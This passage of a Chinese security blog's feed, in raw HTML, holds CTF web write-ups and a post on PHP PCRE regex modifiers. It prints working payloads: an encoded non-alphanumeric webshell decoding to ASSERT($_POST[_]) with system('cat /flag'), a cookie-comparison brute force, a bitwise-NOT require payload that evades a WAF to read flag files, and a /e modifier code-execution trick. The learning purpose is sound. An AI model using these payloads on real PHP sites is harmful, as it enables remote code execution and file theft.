class="token operator">%</span>2b<span class="token operator">%</span>3b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>2e<span class="token operator">%</span>3d<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>3b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>3d<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>3b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>2b<span class="token operator">%</span>2b<span class="token operator">%</span>3b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>2b<span class="token operator">%</span>2b<span class="token operator">%</span>3b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>2b<span class="token operator">%</span>2b<span class="token operator">%</span>3b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>2b<span class="token operator">%</span>2b<span class="token operator">%</span>3b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>2b<span class="token operator">%</span>2b<span class="token operator">%</span>3b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>2b<span class="token operator">%</span>2b<span class="token operator">%</span>3b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>2b<span class="token operator">%</span>2b<span class="token operator">%</span>3b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>2b<span class="token operator">%</span>2b<span class="token operator">%</span>3b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>2b<span class="token operator">%</span>2b<span class="token operator">%</span>3b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>2b<span class="token operator">%</span>2b<span class="token operator">%</span>3b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>2b<span class="token operator">%</span>2b<span class="token operator">%</span>3b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>2b<span class="token operator">%</span>2b<span class="token operator">%</span>3b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>2b<span class="token operator">%</span>2b<span class="token operator">%</span>3b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>2b<span class="token operator">%</span>2b<span class="token operator">%</span>3b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>2b<span class="token operator">%</span>2b<span class="token operator">%</span>3b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>2b<span class="token operator">%</span>2b<span class="token operator">%</span>3b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>2b<span class="token operator">%</span>2b<span class="token operator">%</span>3b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>2b<span class="token operator">%</span>2b<span class="token operator">%</span>3b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>2e<span class="token operator">%</span>3d<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>3b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>3d<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>3b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>2b<span class="token operator">%</span>2b<span class="token operator">%</span>3b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>2b<span class="token operator">%</span>2b<span class="token operator">%</span>3b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>2b<span class="token operator">%</span>2b<span class="token operator">%</span>3b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>2b<span class="token operator">%</span>2b<span class="token operator">%</span>3b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>2b<span class="token operator">%</span>2b<span class="token operator">%</span>3b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>2b<span class="token operator">%</span>2b<span class="token operator">%</span>3b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>2b<span class="token operator">%</span>2b<span class="token operator">%</span>3b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>2b<span class="token operator">%</span>2b<span class="token operator">%</span>3b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>2b<span class="token operator">%</span>2b<span class="token operator">%</span>3b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>2b<span class="token operator">%</span>2b<span class="token operator">%</span>3b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>2b<span class="token operator">%</span>2b<span class="token operator">%</span>3b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>2b<span class="token operator">%</span>2b<span class="token operator">%</span>3b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>2b<span class="token operator">%</span>2b<span class="token operator">%</span>3b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>2b<span class="token operator">%</span>2b<span class="token operator">%</span>3b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>2b<span class="token operator">%</span>2b<span class="token operator">%</span>3b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>2b<span class="token operator">%</span>2b<span class="token operator">%</span>3b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>2b<span class="token operator">%</span>2b<span class="token operator">%</span>3b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>2b<span class="token operator">%</span>2b<span class="token operator">%</span>3b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>2b<span class="token operator">%</span>2b<span class="token operator">%</span>3b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>2e<span class="token operator">%</span>3d<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>3b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>3d<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>3b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span>5f<span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span>5f<span class="token operator">%</span>5b<span class="token operator">%</span>5f<span class="token operator">%</span>5d<span class="token operator">%</span><span class="token number">29</span><span class="token operator">%</span>3b<span class="token comment" spellcheck="true">//</span></code></pre><p>因为携带许多不可打印的字符，所以需要经过url编码后发包传入，以上代码翻译过来就是：<code>ASSERT($_POST[_]);</code>，即可<code>post</code>一个<code>_</code>，字符执行代码，<code>_=system(&#39;cat /flag&#39;);</code>，即可拿到<code>flag</code></p><h3 id="WEB-给你shell"><a href="#WEB-给你shell" class="headerlink" title="WEB_给你shell"></a>WEB_给你shell</h3><p>F12看到源码，且有个提示<code>flag is in /flag.txt</code>：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">//It's no need to use scanner. Of course if you want, but u will find nothing.</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span> <span class="token string">"config.php"</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'view_source'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">checkCookie</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token variable">$arr</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">,</span> <span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string">'{"secret"'</span> <span class="token operator">&amp;&amp;</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/^[\"0-9A-Z]*}$/'</span><span class="token punctuation">,</span> <span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token number">2</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">theFirstTimeSetCookie</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string">'secret'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">haveFun</span><span class="token punctuation">(</span><span class="token variable">$_f_g</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token variable">$_g_r</span> <span class="token operator">=</span> <span class="token number">32</span><span class="token punctuation">;</span>    <span class="token variable">$_m_u</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_f_g</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$_h_p</span> <span class="token operator">=</span> <span class="token function">strtoupper</span><span class="token punctuation">(</span><span class="token variable">$_m_u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$_g_r</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$_i</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$_h_p</span><span class="token punctuation">,</span> <span class="token variable">$i</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$_i</span> <span class="token operator">=</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$_i</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$_i</span> <span class="token operator">&amp;</span> <span class="token number">0xC0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">die</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">'secret'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$json</span> <span class="token operator">=</span> <span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">'secret'</span><span class="token punctuation">]</span> <span class="token punctuation">:</span> <span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string">'secret'</span><span class="token punctuation">,</span> <span class="token string">'{"secret":"'</span> <span class="token punctuation">.</span> <span class="token function">strtoupper</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token string">'y1ng'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">'"}'</span><span class="token punctuation">,</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">7200</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">checkCookie</span><span class="token punctuation">(</span><span class="token variable">$json</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$obj</span> <span class="token operator">=</span> @<span class="token function">json_decode</span><span class="token punctuation">(</span><span class="token variable">$json</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'no'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$obj</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'give_me_shell'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">(</span><span class="token variable">$obj</span><span class="token punctuation">[</span><span class="token string">'secret'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token variable">$flag_md5</span> <span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">haveFun</span><span class="token punctuation">(</span><span class="token variable">$flag</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword">echo</span> <span class="token string">"here is your webshell: $shell_path"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">die</span><span class="token punctuation">;</span></code></pre><p>代码审计后发现是需要<code>get</code>一个<code>give_me_shell</code>，随后才可以进入函数中的三目运算符进行信息的读取，且需要<code>$obj[&#39;secret&#39;] == $flag_md5(推测为$flag的md5值)</code>，才可以进行<code>echo &quot;here is your webshell: $shell_path&quot;;</code>操作</p><p>第一个三目运算符处可以设置一个名为<code>secret</code>的<code>cookie</code>，如果未设置的话系统就会自动帮你设置，随后设置的<code>cookie</code>，<code>secret</code>赋值给<code>$json</code>，进入<code>checkCookie</code>函数，观察函数可得知<code>$json</code>中的格式需要满足一个<code>json</code>的格式，且<code>json</code>中<code>secret</code>值的格式需满足<code>&#39;/^[\&quot;0-9A-Z]*}$/&#39;</code>，然后才能返回<code>true</code>，进入<code>json_decode</code>，将<code>secret</code>的值解析出来，否则<code>die(&#39;no&#39;);</code>，于是我们先传入一个满足条件的<code>secret</code>cookie，看看<code>haveFun($flag)</code>函数返回什么，发包后发现返回这样的一个字符串0006464640064064646464006406464064640064006400000000000，为<code>$flag</code>经过<code>haveFun</code>函数后返回的值，观察函数，其中对<code>$flag</code>进行了md5加密后，对其中的每一个字符都经过<code>ord</code>函数与<code>0xC0</code>经过了与运算</p><p>测试后发现，如果是数字和<code>0xC0</code>来<code>&amp;</code>结果就是0，如果是字母则结果是64，那么则可以确定<code>$flag</code>的前三位为数字，那么我们只需要因为<code>$obj[&#39;secret&#39;] != $flag_md5</code>此处为弱比较，所以我们只需要让<code>$obj[&#39;secret&#39;]</code>，（也就是传入cookie中 secret 值中的secret的值）前三位和<code>$flag_md5</code>的前三位数字相等即可，于是放到burp中爆破，得到<code>secret={&quot;secret&quot;:115}</code>，随后得到<code>$shell_path</code>信息： <code>here is your webshell: w3b5HeLLlll123.php</code></p><p>访问<code>w3b5HeLLlll123.php</code>得到源码：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//there are some secret waf that you will never know, fuzz me if you can</span><span class="token keyword">require</span> <span class="token string">"hidden_filter.php"</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'login'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'&lt;script>location.href=\'./index.php\'&lt;/script>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token variable">$code</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$secret_waf</span><span class="token punctuation">,</span> <span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//清空session 从头再来</span>        <span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">"\$_SESSION["</span> <span class="token punctuation">.</span> <span class="token variable">$code</span> <span class="token punctuation">.</span> <span class="token string">"]=false;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//you know, here is your webshell, an eval() without any disabled_function. However, eval() for $_SESSION only XDDD you noob hacker</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'hacker'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">/* * When you feel that you are lost, do not give up, fight and move on. * Being a hacker is not easy, it requires effort and sacrifice. * But remember … we are legion! *  ————Deep CTF 2020*/</span></code></pre><p>发现<code>eval</code>函数，于是传入code，但是经过了<code>preg_match</code>，并且<code>$secret_waf</code>没给出来，fuzz测试后发现过滤了大多数字符，括号、引号、分号、空格 、反引号、/ \ $ * # ^ &amp;等符号，并且f、sys、include也被过滤，这里直接给出payload：<code>?code=]=1?&gt;&lt;?=require~%d0%99%93%9e%98%d1%8b%87%8b?&gt;</code></p><ul><li><code>]=1?&gt;</code>闭合前面的中括号和php代码，随后执行一句话php代码</li><li>~为反转字符串根据源码提示读取<code>/flag.txt</code></li><li>使用<code>require</code>可以不需要括号</li><li><code>require</code>和<code>~</code>之间不需要空格就可以执行</li></ul><p>得到<code>flag.txt</code>内容：</p><pre><code>可以，说明你ctfshow的红包2没白做，flag在/flag，同样的方法去读取吧。1]=false;</code></pre><p>再读<code>/flag</code>：<code>?code=]=1?&gt;&lt;?=require~%d0%99%93%9e%98?&gt;</code>得到<code>flag</code></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;“温故而知新，可以为师矣”——孔子《论语》&lt;/p&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="https://www.extrader.top/categories/CTF/"/>
    
    
      <category term="CTF题" scheme="https://www.extrader.top/tags/CTF%E9%A2%98/"/>
    
      <category term="代码审计" scheme="https://www.extrader.top/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="php" scheme="https://www.extrader.top/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>php正则表达式(PCRE)模式修饰符</title>
    <link href="https://www.extrader.top/2020/05/19/php%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%A8%A1%E5%BC%8F%E4%BF%AE%E9%A5%B0%E7%AC%A6/"/>
    <id>https://www.extrader.top/2020/05/19/php%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%A8%A1%E5%BC%8F%E4%BF%AE%E9%A5%B0%E7%AC%A6/</id>
    <published>2020-05-19T10:24:20.000Z</published>
    <updated>2020-07-14T10:43:20.585Z</updated>
    
    <content type="html"><![CDATA[<p>php单双引号的区别：</p><p>单引号：php不会读取里面的变量，作为纯字符串处理</p><p>双引号：PHP会尝试读取里面的变量，或者反斜杠表示的特殊符号，例如<code>\n</code>，<code>\0</code>等</p><p>处理字符串变量替换的连接速度方面，php7前单引号会快些，而在php7之后就没区别了，<a href="https://www.laruence.com/2008/08/19/338.html" target="_blank" rel="noopener">详见</a></p><a id="more"></a><h3 id="i-PCRE-CASELESS"><a href="#i-PCRE-CASELESS" class="headerlink" title="i (PCRE_CASELESS)"></a><em>i (PCRE_CASELESS)</em></h3><p>使得模式大小写不敏感</p><p>如果设置了这个修饰符，模式中的字母会进行大小写不敏感匹配。如下：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/php%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%A8%A1%E5%BC%8F%E4%BF%AE%E9%A5%B0%E7%AC%A6/image-20200519183504562.png" alt="" loading="lazy"></p><h3 id="m-PCRE-MULTILINE"><a href="#m-PCRE-MULTILINE" class="headerlink" title="m (PCRE_MULTILINE)"></a><em>m (PCRE_MULTILINE)</em></h3><p>使得模式匹配上任意行之后就返回true</p><p>默认情下，PCRE认为目标字符串是由单行字符组成的<strong>(然而实际上可能会包含多行)</strong>，”行首“元字符<code>(^)</code>仅匹配字符串的开始位置，而”行末“元字符<code>($)</code>仅匹配字符串末尾，或者最后的换行符<strong>(除非设置了D修饰符)</strong>。但也仅仅是行首行末，当这个修饰符设置后，“行首”和“行末”就会匹配目标字符串中任意换行符之前或之后，另外，还分别匹配目标字符串的最开始和最末尾位置，当我们在待匹配的<code>subject</code>处传入一个换行符<strong>(即%0a)</strong>的时候，换行符前的匹配上后，即使后面的匹配不上，表达式会返回1，如下：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/php%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%A8%A1%E5%BC%8F%E4%BF%AE%E9%A5%B0%E7%AC%A6/image-20200519220256656.png" alt="" loading="lazy"></p><p>如果<code>/m</code>使用不当就会存在漏洞从而绕过某些限制</p><h3 id="s-PCRE-DOTALL"><a href="#s-PCRE-DOTALL" class="headerlink" title="s (PCRE_DOTALL)"></a><em>s (PCRE_DOTALL)</em></h3><p>使得<code>.</code>可以匹配换行符</p><p>如果设置了这个修饰符，模式中的点号<code>(.)</code>字符匹配所有的字符，<strong>包含换行符</strong>，如果没有这个修饰符，点号不匹配换行符，如下：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/php%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%A8%A1%E5%BC%8F%E4%BF%AE%E9%A5%B0%E7%AC%A6/image-20200519221410216.png" alt="" loading="lazy"></p><h3 id="D-PCRE-DOLLAR-ENDONLY"><a href="#D-PCRE-DOLLAR-ENDONLY" class="headerlink" title="D (PCRE_DOLLAR_ENDONLY)"></a><em>D (PCRE_DOLLAR_ENDONLY)</em></h3><p>使得<code>$</code>不匹配换行符</p><p>如果设置了这个修饰符，模式中的元字符美元符号<code>($)</code>，仅仅匹配目标字符串的末尾，如果这个修饰符没有设置，当字符串以一个换行符结尾时，美元符号还会匹配该换行符<strong>(但不会匹配之前的任何换行符)</strong>，如果设置了修饰符<em>m</em>，这个修饰符被忽略。如下：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/php%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%A8%A1%E5%BC%8F%E4%BF%AE%E9%A5%B0%E7%AC%A6/image-20200520165220099.png" alt="" loading="lazy"></p><h3 id="x-PCRE-EXTENDED"><a href="#x-PCRE-EXTENDED" class="headerlink" title="x (PCRE_EXTENDED)"></a><em>x (PCRE_EXTENDED)</em></h3><p>使得可以在模式中添加注释</p><p>如果设置了这个修饰符，模式中的没有经过转义的或不在字符类中的空白数据字符总会被忽略，并且位于一个未转义的字符类外部的#字符和下一个换行符之间的字符也被忽略。注意：这仅用于数据字符。 空白字符还是不能在模式的特殊字符序列中出现。如下：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/php%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%A8%A1%E5%BC%8F%E4%BF%AE%E9%A5%B0%E7%AC%A6/image-20200520171421233.png" alt="" loading="lazy"></p><h3 id="e-PREG-REPLACE-EVAL"><a href="#e-PREG-REPLACE-EVAL" class="headerlink" title="e (PREG_REPLACE_EVAL)"></a><em>e (PREG_REPLACE_EVAL)</em></h3><p>这个功能在php5.5.0中已弃用，在php7.0.0中已删除</p><p>如果设置了这个被弃用的修饰符，<a href="https://www.php.net/manual/zh/function.preg-replace.php" target="_blank" rel="noopener">preg_replace()</a> 在进行了对替换字符串的后向引用替换之后, 将替换后的字符串作为<code>php</code>代码评估执行(<code>eval</code>函数方式)，并使用执行结果 作为实际参与替换的字符串。单引号、双引号、反斜线<code>(\)</code>和 NULL 字符在后向引用替换时会被用反斜线转义。以下是典型的一种利用方法</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/php%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%A8%A1%E5%BC%8F%E4%BF%AE%E9%A5%B0%E7%AC%A6/image-20200520173908256.png" alt="" loading="lazy"></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/php%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%A8%A1%E5%BC%8F%E4%BF%AE%E9%A5%B0%E7%AC%A6/image-20200520174020072.png" alt="" loading="lazy"></p><p>虽然传入引号会被转义，但是这并不会影响我们<code>getshell</code>，令第三个参数为<code>{${system($_POST[1])}}</code>即可<code>POST</code>命令执行参数，这里注意需要匹配到<code>${}</code>这种类似的符号包裹着代码的才能进行命令执行，是因为<a href="http://php.net/manual/zh/language.variables.variable.php" target="_blank" rel="noopener">PHP可变变量</a>的原因，<code>${}</code>中包裹的字符则会当做代码执行</p><h3 id="A-PCRE-ANCHORED"><a href="#A-PCRE-ANCHORED" class="headerlink" title="A (PCRE_ANCHORED)"></a><em>A (PCRE_ANCHORED)</em></h3><p>如果设置了这个修饰符，模式被强制为”锚定”模式，也就是说约束匹配使其仅从 目标字符串的开始位置搜索。这个效果同样可以使用适当的模式构造出来(如：<code>^</code>)。简单来讲就是表达式必须是匹配字符串中的开头部分</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/php%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%A8%A1%E5%BC%8F%E4%BF%AE%E9%A5%B0%E7%AC%A6/image-20200520175528269.png" alt="" 